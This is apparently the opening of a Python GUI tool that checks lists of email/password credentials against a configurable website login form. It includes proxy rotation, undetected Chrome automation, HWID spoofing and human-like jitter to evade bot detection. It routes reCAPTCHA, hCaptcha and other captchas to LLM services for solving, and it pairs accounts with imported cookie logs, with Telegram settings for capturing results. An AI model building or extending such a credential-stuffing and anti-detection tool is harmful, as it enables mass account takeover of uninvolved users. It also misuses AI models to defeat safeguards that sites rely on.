import sys
import io

# CRITICAL: Force UTF-8 for all stdout/stderr communication on Windows.
# This must happen before any output is generated or redirectors are initialised.
if sys.platform == "win32":
    try:
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8')
        if hasattr(sys.stderr, 'reconfigure'):
            sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        # Fallback for environments where reconfigure might fail or is unsupported
        try:
            sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
            sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
        except Exception:
            pass

import subprocess
import sys
import platform
import logging
import tkinter as tk
from tkinter import ttk
from tkinter import filedialog, messagebox
import os
import time
import sqlite3
import colorama
from colorama import Fore, Style
import re
import random
import threading
import getpass
from engine.reporting.csv_exporter import SQLiteCSVExporter
from engine.core.cleanup_daemon import CleanupDaemon
from datetime import datetime
import json
import webbrowser
import requests
try:
    import locator
except ImportError:
    from pathlib import Path
    sys.path.append(str(Path(__file__).parent))
    import locator

from engine.kernel.heuristics import _HEURISTIC_SELECTORS, _ERROR_TEXT_PATTERNS, _ERROR_CSS_SELECTORS


# ── CaptchaDispatcher: master routing hub for all captcha workflows ────────────
# Provides type-aware routing to: 6char_alphanum, text_variable, math_captcha,
# image_select, audio_captcha, recaptcha_v2, hcaptcha.
# Falls back gracefully if the ai_captcha package is not present.
try:
    from ai_captcha.captcha_dispatcher import (
        CaptchaDispatcher, get_dispatcher,
        TYPE_6CHAR, TYPE_TEXT, TYPE_MATH, TYPE_IMG_SELECT,
        TYPE_AUDIO, TYPE_RECAPTCHA, TYPE_HCAPTCHA, TYPE_AUTO,
    )
except ImportError:
    CaptchaDispatcher = None  # type: ignore[misc,assignment]
    get_dispatcher = None     # type: ignore[assignment]
    TYPE_6CHAR = "6char_alphanum"
    TYPE_TEXT  = "text_variable"
    TYPE_MATH  = "math_captcha"
    TYPE_IMG_SELECT = "image_select"
    TYPE_AUDIO = "audio_captcha"
    TYPE_RECAPTCHA = "recaptcha_v2"
    TYPE_HCAPTCHA  = "hcaptcha"
    TYPE_AUTO  = "auto"

# Module-level dispatcher singleton - initialised lazily on first use via
# _get_captcha_dispatcher(), which reads the saved OpenRouter API key.
_CAPTCHA_DISPATCHER: 'CaptchaDispatcher | None' = None


def _get_captcha_dispatcher(api_keys=None) -> 'CaptchaDispatcher | None':
    """
    Return the module-level CaptchaDispatcher singleton.

    Reads the GUI "Use Claude Proxy" toggle (var_claude_proxy_enabled) and
    rebuilds the dispatcher whenever the toggle state changes so that captcha
    solving always follows the same backend selected by the user.

    Example usage within check_accounts_logic or similar:

        dispatcher = _get_captcha_dispatcher()
        if dispatcher:
            solution = dispatcher.solve_image(
                image_bytes      = captcha_img_bytes,
                captcha_type     = TYPE_6CHAR,  # or TYPE_AUTO, TYPE_MATH, …
                previous_attempts= [],
            )
    """
    global _CAPTCHA_DISPATCHER
    if get_dispatcher is None:
        return None

    # ── Read the GUI proxy toggle ────────────────────────────────────────────
    force_proxy = False
    try:
        force_proxy = bool(var_claude_proxy_enabled.get())
    except Exception:
        pass

    # Rebuild the singleton when the toggle has changed vs last time
    last_proxy_state = getattr(_get_captcha_dispatcher, '_last_proxy_state', None)
    if _CAPTCHA_DISPATCHER is not None and last_proxy_state == force_proxy:
        return _CAPTCHA_DISPATCHER

    # ── Collect OpenRouter keys (used / or skipped when force_proxy=True) ───
    keys = api_keys
    if not keys:
        try:
            from engine.registry.settings_manager import SettingsManager
            sm = SettingsManager()
            raw = sm.get('openrouter_api_key', '')
            if raw:
                keys = [raw.strip()]
        except Exception:
            pass
    if not keys:
        or_key = var_openrouter_keys.get().strip() if var_openrouter_keys else ''
        keys = [or_key] if or_key else [os.getenv('OPENROUTER_API_KEY', '')]

    _CAPTCHA_DISPATCHER = get_dispatcher(
        api_keys=keys,
        force_new=True,
        force_proxy=force_proxy,
    )
    _get_captcha_dispatcher._last_proxy_state = force_proxy
    return _CAPTCHA_DISPATCHER

try:
    from engine.kernel.selector_discoverer import SelectorDiscoverer
except ImportError:
    SelectorDiscoverer = None

# Global OpenRouter Integration Instance
_OPENROUTER_INTEGRATION: 'OpenRouterIntegration | None' = None

def _get_openrouter_integration(api_keys=None) -> 'OpenRouterIntegration | None':
    """Return the module-level OpenRouterIntegration singleton."""
    global _OPENROUTER_INTEGRATION
    if _OPENROUTER_INTEGRATION is not None:
        return _OPENROUTER_INTEGRATION
    try:
        from engine.integrations.openrouter_integration import OpenRouterIntegration
        _OPENROUTER_INTEGRATION = OpenRouterIntegration(api_keys=api_keys)
        return _OPENROUTER_INTEGRATION
    except ImportError:
        return None

# Stealth & AI Imports
try:
    from openrouter_client import OpenRouterClient
    from engine.integrations.openrouter_integration import OpenRouterIntegration
    import browser_reinstaller
    from browser_reinstaller import BrowserReinstaller
    from session_isolation import SessionIsolationManager
    from human_jitter import HumanJitter
    from network_stealth import apply_network_stealth
except ImportError:
    pass

import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    ElementClickInterceptedException,
    TimeoutException,
    NoSuchElementException,
    WebDriverException
)

# Initialize colorama for colored console output
colorama.init(autoreset=True)

# -------------------
# Global Variables
# -------------------
# Global Variables
# -------------------
browser = None
profile_name = ""
proxies = []
config_file_path = locator.get_absolute_path("engine/registry/config.json")
custom_user_agents_file = ""
chromedriver_args = []


# =============================================================================
# Thread-Safe Proxy Rotator Singleton
# Provides per-account proxy assignment without race conditions.
# Supports both round-robin (Static Proxies) and random (Rotating Proxies) modes.
# Dead proxies are automatically skipped after 3 consecutive failures.
# =============================================================================

class ProxyRotator:
    """
    Thread-safe proxy rotator singleton.

    Usage::
        ProxyRotator.load(proxies_list, mode="Static Proxies")
        proxy_str = ProxyRotator.get_next()    # returns e.g. "http://1.2.3.4:8080"
        ProxyRotator.report_failure(proxy_str) # increments failure counter
        ProxyRotator.report_success(proxy_str) # resets failure counter
    """

    # Regex: validates ip:port or user:pass@ip:port (with optional scheme)
    _PROXY_RE = re.compile(
        r'^(?:[a-zA-Z][a-zA-Z0-9+\-.]*://)?'           # optional scheme
        r'(?:[^:@\s]+:[^@\s]+@)?'                       # optional user:pass@
        r'(?:\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'       # IPv4
        r'|(?:[a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,}'           # or hostname
        r'|localhost)'
        r':\d{2,5}$',
        re.IGNORECASE
    )
    _MAX_CONSECUTIVE_FAILURES: int = 3

    _lock         = threading.Lock()
    _proxies      : list   = []
    _mode         : str    = "Static Proxies"
    _index        : int    = 0
    _failures     : dict   = {}   # proxy_str -> consecutive_fail_count
    _instance_flag: bool   = False

    @classmethod
    def load(cls, proxy_list: list, mode: str = "Static Proxies") -> None:
        """
        Load and validate a proxy list.
        Strips blank entries, enforces IP:PORT format (with optional scheme / auth),
        and resets the rotation index and failure counters.

        Args:
            proxy_list: Raw proxy strings from the UI or file.
            mode: "Static Proxies" (round-robin) or "Rotating Proxies" (random).
        """
        with cls._lock:
            validated: list = []
            for raw in proxy_list:
                p = (raw or "").strip()
                if not p or p.startswith('#'):
                    continue
                # Normalise: strip any bare scheme (http:// / socks5:// etc.) for
                # format-validation only - we keep the original string for Chrome.
                test_str = p
                if '://' in test_str:
                    test_str = test_str.split('://', 1)[1]
                # Re-add dummy scheme so regex can validate auth + host + port
                if not cls._PROXY_RE.match('http://' + test_str):
                    logger_v2 = logging.getLogger('validator_pro_v2.ProxyRotator')
                    logger_v2.warning(f"[ProxyRotator] Skipping malformed proxy entry: {p!r}")
                    continue
                validated.append(p)
            cls._proxies  = validated
            cls._mode     = mode
            cls._index    = 0
            cls._failures = {p: 0 for p in validated}
            cls._instance_flag = True
            _log = logging.getLogger('validator_pro_v2.ProxyRotator')
            _log.info(f"[ProxyRotator] Loaded {len(validated)} valid proxies (mode={mode}).")

    @classmethod
    def get_next(cls, proxy_type: str = "HTTP") -> str | None:
        """
        Return the next proxy string pre-formatted for Chrome's --proxy-server flag.
        Thread-safe - multiple account threads may call this concurrently.

        Returns None when no proxies are loaded or all proxies are exhausted / dead.

        Args:
            proxy_type: "HTTP", "HTTPS", or "SOCKS5" - determines the scheme prefix
                        injected into the returned string.
        """
        with cls._lock:
            if not cls._proxies:
                return None

            # Build a list of proxies that are still alive (< max consecutive failures).
            alive = [
                p for p in cls._proxies
                if cls._failures.get(p, 0) < cls._MAX_CONSECUTIVE_FAILURES
            ]
            if not alive:
                _log = logging.getLogger('validator_pro_v2.ProxyRotator')
                _log.error("[ProxyRotator] ALL proxies have exceeded the failure threshold. "
                           "Resetting failure counters and reusing the full list.")
                # Reset so the run continues rather than leaving accounts with no proxy.
                cls._failures = {p: 0 for p in cls._proxies}
                alive = list(cls._proxies)

            if cls._mode == "Static Proxies":
                # Round-robin across the alive list
                proxy_raw = alive[cls._index % len(alive)]
                cls._index += 1
            else:
                # "Rotating Proxies" - fully random
                proxy_raw = random.choice(alive)

            # Ensure the returned string has the user-selected scheme prefix.
            # Strip any existing scheme first so we never double-wrap.
            proxy_clean = proxy_raw.strip()
            if '://' in proxy_clean:
                proxy_clean = proxy_clean.split('://', 1)[1]

            scheme = proxy_type.lower() if proxy_type.lower() in ('http', 'https', 'socks5') else 'http'
            return f"{scheme}://{proxy_clean}"

    @classmethod
    def report_failure(cls, proxy_url: str) -> None:
        """Increment the consecutive-failure counter for a proxy after a failed request."""
        with cls._lock:
            # Match against either the raw string or the stripped version
            for p in cls._proxies:
                if proxy_url and (p in proxy_url or proxy_url in p):
                    cls._failures[p] = cls._failures.get(p, 0) + 1
                    _log = logging.getLogger('validator_pro_v2.ProxyRotator')
                    _log.warning(
                        f"[ProxyRotator] Proxy {p!r} failure count: "
                        f"{cls._failures[p]}/{cls._MAX_CONSECUTIVE_FAILURES}"
                    )
                    break

    @classmethod
    def report_success(cls, proxy_url: str) -> None:
        """Reset the consecutive-failure counter for a proxy after a successful request."""
        with cls._lock:
            for p in cls._proxies:
                if proxy_url and (p in proxy_url or proxy_url in p):
                    cls._failures[p] = 0
                    break

    @classmethod
    def is_loaded(cls) -> bool:
        """Returns True if at least one valid proxy has been loaded."""
        with cls._lock:
            return bool(cls._proxies)

    @classmethod
    def count(cls) -> int:
        """Returns the total number of loaded proxies."""
        with cls._lock:
            return len(cls._proxies)


import re as _re_module  # ensure re is available at module level for ProxyRotator


window = tk.Tk()
# CRITICAL: Hide the window immediately. Without this, window.state("zoomed") at
# line ~4584 shows a black frozen maximized window for ~5 seconds while the
# remaining module-level code runs without an event loop to service paint events.
window.withdraw()


# Define tkinter variables
var_inner_html_capture = tk.BooleanVar()
var_outer_html_capture = tk.BooleanVar()
var_cleanup_enabled = tk.BooleanVar(value=True)
var_telegram_enabled = tk.BooleanVar()
capture_telegram_bot_token = tk.StringVar()
capture_telegram_chat_id = tk.StringVar()
var_proxy_enabled = tk.BooleanVar()
var_load_extensions = tk.BooleanVar()
var_disable_notifications = tk.BooleanVar()
var_disable_infobars = tk.BooleanVar()
var_start_maximized = tk.BooleanVar()
var_disable_extensions_option = tk.BooleanVar()
var_headless = tk.BooleanVar()
var_custom_user_agents = tk.BooleanVar()
var_enable_mouse_clicks = tk.BooleanVar()
var_incognito_mode = tk.BooleanVar(value=True)
var_invalid_account_enabled = tk.BooleanVar(value=True)
var_captcha_wrong_enabled = tk.BooleanVar()
var_use_database = tk.BooleanVar(value=True)  # New variable for database toggle
var_use_same_session = tk.BooleanVar(value=False)  # New variable for session persistence
var_capture_screenshot = tk.BooleanVar(value=True)  # New variable for screenshot capture toggle

# Stealth Variables
var_reinstall = tk.BooleanVar(value=True)
var_jitter = tk.BooleanVar(value=True)
var_isolation = tk.BooleanVar(value=True)
var_hwid_spoof = tk.BooleanVar(value=True)
var_developer_mode = tk.BooleanVar(value=True)  # Auto-enable Chrome Developer Mode for extensions
var_openrouter_keys = tk.StringVar(value="")
var_openrouter_model = tk.StringVar(value="google/gemini-2.0-flash-lite-preview-02-05:free")

# ── Claude proxy fallback (antigravity-claude-proxy) ─────────────────────────
# When enabled, the discovery pipeline tries the Claude proxy if OpenRouter fails.
var_claude_proxy_enabled = tk.BooleanVar(value=False)
var_claude_proxy_url     = tk.StringVar(value="http://localhost:8080")
var_claude_proxy_model   = tk.StringVar(value="gemini-3-flash")

var_proxy_list_path = tk.StringVar(value="")

# Variables for Third-Party Captcha Solvers
var_captcha_service = tk.StringVar(value="capsolver")
var_captcha_api_key = tk.StringVar(value="")
var_cookie_list_path = tk.StringVar(value="")

# --- Automated Log Ingestion & Per-Account Cookie Pairing Engine ---
var_log_ingestion_enabled = tk.BooleanVar(value=False)   # Enable automated per-account cookie mode
var_log_ingestion_isolate  = tk.BooleanVar(value=True)   # Auto-activate session isolation in log mode
_log_ingestion_pairs: list = []                          # In-memory scan registry [{email, password, cookie_path}]

mouse_click_frames = []
mouse_clicks = []
css_click_frames = []  # For CSS Selector-based clicks
css_clicks = []
chromedriver_args_list = []
config_file_path = ""
settings_file = locator.get_absolute_path("engine/registry/settings.json")  # For JSON module

# Define the path to the Chrome executable and user data directory
user_data_dir = locator.get_chrome_user_data_dir()

# Database name
db_name = locator.get_absolute_path("output/checked_accounts.db")

# Thread Control Events
pause_event = threading.Event()
stop_event = threading.Event()

# -------------------
# Helper Classes and Functions
# -------------------


class CreateToolTip:
    """
    Create a tooltip for a given widget
    """

    def __init__(self, widget, text="widget info"):
        self.widget = widget
        self.text = text
        self.widget.bind("<Enter>", self.enter)
        self.widget.bind("<Leave>", self.leave)
        self.tipwindow = None

    def enter(self, event=None):
        self.showtip(self.text)

    def leave(self, event=None):
        self.hidetip()

    def showtip(self, text):
        """Display text in tooltip window"""
        if self.tipwindow or not text:
            return
        x = self.widget.winfo_rootx() + self.widget.winfo_width() // 2
        y = self.widget.winfo_rooty() + self.widget.winfo_height()
        self.tipwindow = tw = tk.Toplevel(self.widget)
        tw.wm_overrideredirect(True)  # Remove window decorations
        tw.wm_geometry(f"+{x}+{y}")
        label = tk.Label(
            tw,
            text=text,
            justify="left",
            background="#ffffe0",
            relief="solid",
            borderwidth=1,
            font=("Helvetica", "9", "normal"),
        )
        label.pack(ipadx=1)

    def hidetip(self):
        tw = self.tipwindow
        self.tipwindow = None
        if tw:
            tw.destroy()


# ── DRAGGABLE FIELDS BUILDER SYSTEM ──────────────────────────────────────────

DEFAULT_FIELDS_SEQUENCE = [
    {"id": "website_target_link", "type": "default", "label": "Website Target Link (Required):", "var_name": "website_target_link"},
    {"id": "website_valid_link", "type": "default", "label": "Website Valid Link (Required):", "var_name": "website_valid_link"},
    {"id": "redirect_url", "type": "default", "label": "Redirect URL (Optional):", "var_name": "redirect_url"},
    {"id": "css_selector_email", "type": "default", "label": "CSS Selector for Email / Username (Required):", "var_name": "css_selector_email"},
    {"id": "css_selector_next_button", "type": "default", "label": "CSS Selector for Next Button (Optional):", "var_name": "css_selector_next_button"},
    {"id": "sleep_email", "type": "default", "label": "Sleep Duration (0-100 sec) Seconds it takes to load the Email/Username field:", "var_name": "sleep_email"},
    {"id": "css_selector_password", "type": "default", "label": "CSS Selector for Password (Required):", "var_name": "css_selector_password"},
    {"id": "css_selector_next_button_password", "type": "default", "label": "CSS Selector for Next Button (Optional):", "var_name": "css_selector_next_button_password"},
    {"id": "sleep_password", "type": "default", "label": "Sleep Duration (0-100 sec) Seconds it takes to load the Password field:", "var_name": "sleep_password"},
    {"id": "css_selector_submit", "type": "default", "label": "CSS Selector for Submit / Login Button (Required):", "var_name": "css_selector_submit"},
    {"id": "sleep_submit", "type": "default", "label": "Sleep Duration (0-100 sec) Seconds it takes to load the Submit/Button field:", "var_name": "sleep_submit"},
]

fields_sequence = list(DEFAULT_FIELDS_SEQUENCE)


class DraggableFieldBlock(tk.Frame):
    def __init__(self, parent, field_info, manager, colors, *args, **kwargs):
        super().__init__(
            parent,
            bg=colors["surface"],
            highlightbackground="#2d3748",
            highlightcolor=colors["accent"],
            highlightthickness=1,
            bd=0,
            *args,
            **kwargs
        )
        self.field_info = field_info
        self.manager = manager
        self.colors = colors
        self.dragging = False
        
        self.columnconfigure(1, weight=1)
        
        # 1. Grip Handle
        self.grip = tk.Label(
            self,
            text=" ☰ ",
            font=("Inter", 12, "bold"),
            fg=colors["accent"] if field_info.get("type", "default") == "default" else "#14b8a6",
            bg=colors["surface"],
            cursor="fleur"
        )
        self.grip.grid(row=0, column=0, padx=(10, 5), pady=8, sticky="w")
        CreateToolTip(self.grip, "Drag to reorder this step")
        
        # 2. Label
        self.label = tk.Label(
            self,
            text=field_info["label"],
            font=("Inter", 9, "bold"),
            fg=colors["fg"],
            bg=colors["surface"],
            anchor="w",
            justify="left"
        )
        self.label.grid(row=0, column=1, padx=5, pady=8, sticky="w")
        
        # 3. Widget Frame for input controls
        self.widget_frame = tk.Frame(self, bg=colors["surface"])
        self.widget_frame.grid(row=0, column=2, padx=10, pady=8, sticky="e")
        
        self.var_name = field_info.get("var_name", "")
        self.field_id = field_info["id"]
        
        # Render specific controls
        if field_info["type"] == "default":
            if self.var_name.startswith("sleep_"):
                self.entry = ttk.Entry(self.widget_frame, width=10)
                self.entry.pack(side="left", padx=5)
                self.entry.bind("<KeyRelease>", lambda e: _schedule_auto_save())
                globals()[f"entry_{self.var_name}"] = self.entry
            else:
                self.entry = ttk.Entry(self.widget_frame, width=45, foreground=colors["fg_sub"])
                self.entry.pack(side="left", padx=5)
                
                if self.var_name == "website_target_link":
                    global combo_discover_mode
                    self.combo_discover_mode = ttk.Combobox(
                        self.widget_frame,
                        values=["✨ Standard (AI Crew)", "🤖 Rust Agent-Browser"],
                        width=22,
                        state="readonly"
                    )
                    self.combo_discover_mode.set("✨ Standard (AI Crew)")
                    self.combo_discover_mode.pack(side="left", padx=5)
                    combo_discover_mode = self.combo_discover_mode
                    
                    global btn_discover
                    self.btn_discover = ttk.Button(
                        self.widget_frame,
                        text="✨ Auto-Discover",
                        command=handle_auto_discovery
                    )
                    self.btn_discover.pack(side="left", padx=5)
                    btn_discover = self.btn_discover
                    CreateToolTip(self.btn_discover, "Auto-detect form elements using AI.")
                    
                globals()[f"entry_{self.var_name}"] = self.entry
                self.entry.bind("<KeyRelease>", lambda e: _schedule_auto_save())
                
        elif field_info["type"] == "custom_text":
            self.sel_entry = ttk.Entry(self.widget_frame, width=20)
            self.sel_entry.insert(0, field_info.get("selector", ""))
            self.sel_entry.pack(side="left", padx=3)
            self.sel_entry.bind("<KeyRelease>", lambda e: _schedule_auto_save())
            CreateToolTip(self.sel_entry, "Custom CSS Selector")
            
            self.val_entry = ttk.Entry(self.widget_frame, width=20)
            self.val_entry.insert(0, field_info.get("value", ""))
            self.val_entry.pack(side="left", padx=3)
            self.val_entry.bind("<KeyRelease>", lambda e: _schedule_auto_save())
            CreateToolTip(self.val_entry, "Text value (supports {email}, {password})")
            
        elif field_info["type"] == "custom_click":
            self.sel_entry = ttk.Entry(self.widget_frame, width=40)
            self.sel_entry.insert(0, field_info.get("selector", ""))
            self.sel_entry.pack(side="left", padx=3)
            self.sel_entry.bind("<KeyRelease>", lambda e: _schedule_auto_save())
            CreateToolTip(self.sel_entry, "Custom CSS Selector to Click")
            
        elif field_info["type"] == "custom_sleep":
            self.val_entry = ttk.Entry(self.widget_frame, width=10)
            self.val_entry.insert(0, str(field_info.get("value", "5")))
            self.val_entry.pack(side="left", padx=3)
            self.val_entry.bind("<KeyRelease>", lambda e: _schedule_auto_save())
            
            lbl_sec = tk.Label(self.widget_frame, text="sec", fg=colors["fg_sub"], bg=colors["surface"])
            lbl_sec.pack(side="left", padx=2)
            CreateToolTip(self.val_entry, "Duration to wait in seconds")
            
        elif field_info["type"] == "workflow_rule":
            # Display a nice summary text of the actions/timing and an Edit button
            actions_summary = []
            actions_dict = field_info.get("actions", {})
            for act, val in actions_dict.items():
                if val.get("enabled"):
                    act_name = act.replace("basic_", "").replace("security_", "").replace("session_", "").replace("logic_", "").capitalize()
                    actions_summary.append(act_name)
                    
            timing_summary = []
            timing_dict = field_info.get("timing", {})
            for tim, val in timing_dict.items():
                if val.get("enabled"):
                    timing_summary.append(tim.replace("before_", "Before ").replace("after_", "After ").capitalize())
            
            summary_text = f"Actions: {', '.join(actions_summary) if actions_summary else 'None'} | Trigger: {', '.join(timing_summary) if timing_summary else 'Sequential'}"
            self.val_lbl = tk.Label(self.widget_frame, text=summary_text, fg="#14b8a6", bg=colors["surface"], font=("Consolas", 9, "bold"))
            self.val_lbl.pack(side="left", padx=5)
            
            self.btn_edit = tk.Button(
                self.widget_frame,
                text=" ✏️ Edit ",
                font=("Inter", 8, "bold"),
                fg=colors["fg"],
                bg="#2d3748",
                activebackground=colors["accent"],
                relief="flat",
                bd=0,
                command=lambda f=field_info: open_workflow_builder(f)
            )
            self.btn_edit.pack(side="left", padx=5)
            CreateToolTip(self.btn_edit, "Edit this workflow rule's actions and timing triggers")
            
        # Delete Button (for custom fields)
        if field_info["type"] != "default":
            self.btn_delete = tk.Button(
                self,
                text=" ✖ ",
                font=("Inter", 9, "bold"),
                fg="#e53e3e",
                activeforeground="#ffffff",
                bg=colors["surface"],
                activebackground="#e53e3e",
                relief="flat",
                bd=0,
                command=lambda: self.manager.remove_field(self.field_info["id"])
            )
            self.btn_delete.grid(row=0, column=3, padx=(5, 10), pady=8, sticky="e")
            CreateToolTip(self.btn_delete, "Delete this custom step")
            
        # Bind dragging actions
        self.grip.bind("<ButtonPress-1>", self.start_drag)
        self.grip.bind("<B1-Motion>", self.do_drag)
        self.grip.bind("<ButtonRelease-1>", self.stop_drag)

    def start_drag(self, event):
        if self.manager.locked:
            return
        self.dragging = True
        self.start_y = event.y_root
        self.start_top = self.winfo_y()
        # Visual glow highlight
        self.config(bg="#1e293b", highlightbackground=self.colors["accent"])
        self.grip.config(bg="#1e293b")
        self.label.config(bg="#1e293b")
        self.widget_frame.config(bg="#1e293b")
        self.lift()

    def do_drag(self, event):
        if not self.dragging or self.manager.locked:
            return
        dy = event.y_root - self.start_y
        current_y = self.start_top + dy
        self.place(x=self.winfo_x(), y=current_y)
        
        my_idx = self.manager.blocks.index(self)
        new_idx = my_idx
        
        if dy > 0:
            for i in range(my_idx + 1, len(self.manager.blocks)):
                other = self.manager.blocks[i]
                if current_y + self.winfo_height() / 2 > other.winfo_y() + other.winfo_height() / 2:
                    new_idx = i
        elif dy < 0:
            for i in range(my_idx - 1, -1, -1):
                other = self.manager.blocks[i]
                if current_y + self.winfo_height() / 2 < other.winfo_y() + other.winfo_height() / 2:
                    new_idx = i
                    
        if new_idx != my_idx:
            self.manager.fields_data[my_idx], self.manager.fields_data[new_idx] = \
                self.manager.fields_data[new_idx], self.manager.fields_data[my_idx]
            self.manager.blocks[my_idx], self.manager.blocks[new_idx] = \
                self.manager.blocks[new_idx], self.manager.blocks[my_idx]
                
            for idx, b in enumerate(self.manager.blocks):
                if b != self:
                    b.pack_forget()
                    b.pack(fill="x", padx=10, pady=5)
            
            self.start_y = event.y_root
            self.start_top = self.winfo_y()

    def stop_drag(self, event):
        if not self.dragging:
            return
        self.dragging = False
        self.place_forget()
        
        self.config(bg=self.colors["surface"], highlightbackground="#2d3748")
        self.grip.config(bg=self.colors["surface"])
        self.label.config(bg=self.colors["surface"])
        self.widget_frame.config(bg=self.colors["surface"])
        
        for b in self.manager.blocks:
            b.pack_forget()
            b.pack(fill="x", padx=10, pady=5)
            
        global fields_sequence
        fields_sequence = self.manager.fields_data
        save_settings()

    def lock(self):
        if hasattr(self, "entry"):
            self.entry.config(state="disabled")
        if hasattr(self, "sel_entry"):
            self.sel_entry.config(state="disabled")
        if hasattr(self, "val_entry"):
            self.val_entry.config(state="disabled")
        if hasattr(self, "combo_discover_mode"):
            self.combo_discover_mode.config(state="disabled")
        if hasattr(self, "btn_discover"):
            self.btn_discover.config(state="disabled")
        if hasattr(self, "btn_delete"):
            self.btn_delete.config(state="disabled")
        if hasattr(self, "btn_edit"):
            self.btn_edit.config(state="disabled")
            
    def unlock(self):
        if hasattr(self, "entry"):
            self.entry.config(state="normal")
        if hasattr(self, "sel_entry"):
            self.sel_entry.config(state="normal")
        if hasattr(self, "val_entry"):
            self.val_entry.config(state="normal")
        if hasattr(self, "combo_discover_mode"):
            self.combo_discover_mode.config(state="readonly")
        if hasattr(self, "btn_discover"):
            self.btn_discover.config(state="normal")
        if hasattr(self, "btn_delete"):
            self.btn_delete.config(state="normal")
        if hasattr(self, "btn_edit"):
            self.btn_edit.config(state="normal")


class DraggableFieldManager:
    def __init__(self, parent_frame, fields_data, colors):
        self.parent = parent_frame
        self.fields_data = fields_data
        self.colors = colors
        self.blocks = []
        self.locked = False
        
    def rebuild_ui(self):
        for block in self.blocks:
            block.destroy()
        self.blocks = []
        
        for field in self.fields_data:
            block = DraggableFieldBlock(self.parent, field, self, self.colors)
            block.pack(fill="x", padx=10, pady=5)
            self.blocks.append(block)
            
            if self.locked:
                block.lock()
                
    def lock_all(self):
        self.locked = True
        for b in self.blocks:
            b.lock()
            
    def unlock_all(self):
        self.locked = False
        for b in self.blocks:
            b.unlock()
            
    def remove_field(self, field_id):
        self.fields_data = [f for f in self.fields_data if f["id"] != field_id]
        global fields_sequence
        fields_sequence = self.fields_data
        self.rebuild_ui()
        save_settings()
        
    def add_field(self, field_type, label, selector="", value=""):
        import time
        field_id = f"custom_field_{int(time.time())}"
        new_field = {
            "id": field_id,
            "type": field_type,
            "label": label,
            "var_name": field_id,
            "selector": selector,
            "value": value
        }
        self.fields_data.append(new_field)
        global fields_sequence
        fields_sequence = self.fields_data
        self.rebuild_ui()
        save_settings()


def print_action(message):
    """Prints a colored action message."""
    try:
        print(f"{Fore.BLUE}{message}{Style.RESET_ALL}")
    except UnicodeEncodeError:
        # Handle characters that can't be encoded
        message = message.encode('ascii', 'ignore').decode('ascii')
        print(f"{Fore.BLUE}{message}{Style.RESET_ALL}")


def print_checkpoint(delay):
    """Prints a blue checkpoint message with the delay."""
    try:
        print(f"{Fore.BLUE}Checkpoint: Delaying for {delay:.2f} seconds{Style.RESET_ALL}")
    except UnicodeEncodeError:
        print(f"{Fore.BLUE}Checkpoint: Delaying for {delay:.2f} seconds (Unicode error in message){Style.RESET_ALL}")


def update_pip():
    """Upgrades pip to the latest version."""
    try:
        subprocess.check_call(
            [
                sys.executable,
                "-m",
                "pip",
                "install",
                "--upgrade",
                "pip",
            ]
        )
        print_action("Pip upgraded successfully.")
    except subprocess.CalledProcessError:
        print_action("Pip is already up-to-date or failed to upgrade.")


def check_python_version():
    """
    Checks if Python 3.11 or higher is installed.
    """
    python_version = platform.python_version()
    major, minor, micro = map(int, python_version.split('.'))
    if (major, minor) < (3, 11):
        messagebox.showerror(
            "Python Version Error",
            f"Python 3.11 or higher is required. You have {python_version} installed.\n"
            f"Please download it from https://www.python.org/downloads/",
        )
        sys.exit(1)


def force_close_chrome_processes():
    """Force closes all running Chrome.exe processes."""
    print_action("Force closing existing Chrome processes...")
    try:
        subprocess.run(
            ["taskkill", "/f", "/im", "chrome.exe"],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
        )
        print_action("Chrome processes closed successfully.")
    except subprocess.CalledProcessError:
        print_action("No Chrome processes were running.")


# Windows-only flag: suppresses console windows spawned by subprocess calls.
_NO_WINDOW = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0


# Map pip package names to their importable module names (they often differ)
_PACKAGE_IMPORT_NAMES = {
    "pillow": "PIL",
    "Pillow": "PIL",
    "chromedriver-autoinstaller": "chromedriver_autoinstaller",
    "pyautogui": "pyautogui",
    "selenium": "selenium",
    "colorama": "colorama",
    "requests": "requests",
    "httpx": "httpx",
    "cryptography": "cryptography",
}


def install_or_upgrade_package(package_name):
    """
    Installs or upgrades a package via pip subprocess.
    Only called when importlib.util.find_spec confirms the package is absent.
    Uses stdin=DEVNULL so the subprocess never blocks waiting on stdin.

    Args:
        package_name (str): The pip package name to install or upgrade.
    """
    _common_kwargs = dict(
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=120,
    )
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", package_name],
            **_common_kwargs,
        )
        print_action(
            f"{Fore.GREEN}{package_name} package installed successfully.{Style.RESET_ALL}"
        )
    except subprocess.CalledProcessError:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "--upgrade", package_name],
                **_common_kwargs,
            )
            print_action(
                f"{Fore.GREEN}{package_name} package upgraded successfully.{Style.RESET_ALL}"
            )
        except subprocess.CalledProcessError:
            print_action(
                f"{Fore.RED}Failed to install/upgrade {package_name}.{Style.RESET_ALL}"
            )
    except Exception as exc:
        print_action(
            f"{Fore.YELLOW}Install subprocess error for {package_name}: {exc}{Style.RESET_ALL}"
        )


def check_and_install_packages(package_list):
    """
    Checks whether each package is importable using importlib.util.find_spec —
    a pure in-process check with zero subprocess overhead — and installs any
    that are missing via pip.  This replaces the old `pip show` subprocess
    approach which would hang/timeout in no-console background-thread contexts.

    Args:
        package_list (list): pip package names to verify/install.
    """
    import importlib.util
    for package in package_list:
        # Resolve the importable module name from the pip package name
        import_name = _PACKAGE_IMPORT_NAMES.get(
            package,
            package.lower().replace("-", "_").split("[")[0],
        )
        try:
            spec = importlib.util.find_spec(import_name)
        except (ModuleNotFoundError, ValueError):
            spec = None

        if spec is not None:
